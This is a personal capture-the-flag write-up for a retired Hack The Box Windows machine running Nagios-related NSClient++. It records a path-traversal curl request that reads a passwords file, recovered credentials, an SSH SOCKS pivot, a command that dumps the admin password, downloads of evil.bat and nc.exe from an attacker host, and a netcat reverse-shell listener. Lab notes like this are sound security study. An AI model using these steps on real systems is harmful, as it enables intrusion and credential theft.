---
tags:
  - HTB
  - Retired
  - Windows
  - nagios
  - proxychains
creation date: 2018-09-29
Date Completed: 2024-08-24
CVEs: CVE-2019-20085
URL: 
IP: 10.129.227.77
New Tools: rlwrap
---
## Information Gathering


```
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|_    :Saturday
| http-title: NSClient++
|_Requested resource was /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

```
ftp anonymous@$IP
```
discover users and files with hints

https://github.com/daffainfo/my-nuclei-templates/blob/main/CVE-2019-20085.yaml

```
curl http://10.129.227.77/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FNathan%2FDesktop%2FPasswords.txt -o passwords.txt
```

password spray to get:
nadine
L1k3B1gBut7s@W0rk
ssh -D 9050 nadine@10.129.63.164


```
C:\Program Files\NSClient++> nscp web -- password --display
```
ew2x6SsGTxjRwXOT

https://www.exploit-db.com/exploits/46802


To access website through proxychains4
add line to proxychains4.conf
    socks5 127.0.0.1 9050
Add socks proxy to foxyproxy
    Type: SOCKS5    Hostname: 127.0.0.1 Port: 9050
    
Browse to website
    https://127.0.0.1:8443
    
        
```
iwr http://10.10.15.64:8000/evil.bat -outfile evil.bat 
iwr http://10.10.15.64:8000/nc.exe -outfile nc.exe
```

Follow the exploit and restart the service using the web interface (Control > Restart)

https://0xdf.gitlab.io/2020/06/20/htb-servmon.html#priv-nadine--system


```
rlwrap nc -lnvp 1234
```




